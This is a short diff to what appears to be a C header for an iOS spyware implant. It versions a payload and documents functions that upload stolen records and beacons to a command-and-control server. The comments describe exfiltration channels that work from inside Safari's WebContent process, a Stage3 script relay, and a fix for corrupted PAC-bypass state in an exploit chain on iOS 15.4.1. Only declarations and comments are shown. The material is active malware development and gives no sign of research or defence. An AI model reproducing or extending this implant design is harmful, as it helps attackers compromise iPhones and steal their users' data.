@@ -13,7 +13,7 @@
  * behaviour so the operator can confirm which version is running on-device.
  * Format: "<major>.<minor>".  Major = breaking change, minor = incremental.
  */
-#define PAYLOAD_VERSION "1.6"
+#define PAYLOAD_VERSION "1.7"
 
 /*
  * upload_to_c2 — HTTP(S) POST one record to the Go /upload endpoint.
@@ -26,9 +26,10 @@
  *   C — JSContext fetch() injection (WebContent JS thread / saved context)
  *   B — raw POSIX socket + SecureTransport TLS
  *   A — NSURLSession (blocked in WebContent, used outside WebContent)
- *   D — in-memory queue (g_cru_q) read by Stage3 JS after _process() returns;
- *       Stage3 POSTs items via fetch() — always permitted in WebContent.
- *       Items with base64 length ≥ CRU_Q_B64MAX are silently skipped.
+ *   D2 — window.__d1_q push via JSContext (upload_beacon only); Stage3 reads
+ *        the plain JS array and relays via XHR without exploit primitives.
+ *        Fixes v1.5/v1.6 regression on iOS 15.4.1 (ep.read32 after Pt()
+ *        corrupted PAC-bypass state → outcome=fail).
  */
 void upload_to_c2(const char *category, const char *path,
                   const char *description, const char *b64data);
@@ -36,18 +37,17 @@ void upload_to_c2(const char *category, const char *path,
 /*
  * upload_beacon — synchronous diagnostic probe called from process().
  *
- * Channel priority: C → B → A → D (same as upload_to_c2).
+ * Channel priority: C → B → A → D2 (window.__d1_q push).
  *
- * v1.5: Channel D is the new primary WebContent fallback.  If C/B/A all
- * fail (as observed in iOS 15–16 WebContent), the beacon is written into
- * g_cru_q[] and Stage3 relays it immediately after _process() returns.
+ * v1.7: Channel D2 replaces D1 (cru_queue kernel-read relay).
+ *   Stage3 reads window.__d1_q (plain JS array) instead of g_cru_q[]
+ *   via exploitPrimitive.read32, preventing PAC-bypass state corruption.
  *
  * Log signatures:
- *   beacon in logs with (jsc)  → Channel C succeeded
- *   beacon in logs without tag → Channel B or A succeeded
- *   beacon relayed by Stage3   → Channel D succeeded (path=/coruna/beacon,
- *                                 description contains "v1.5")
- *   beacon absent              → all channels failed; file a bug
+ *   cat=system path=/coruna/beacon desc has "(jsc)"  → Channel C
+ *   cat=system path=/coruna/beacon desc has no tag   → Channel B or A
+ *   Stage3 logs "[D2] relay cnt=1"                   → Channel D2 relay
+ *   No beacon at all                                 → all channels failed
  */
 void upload_beacon(void);
 
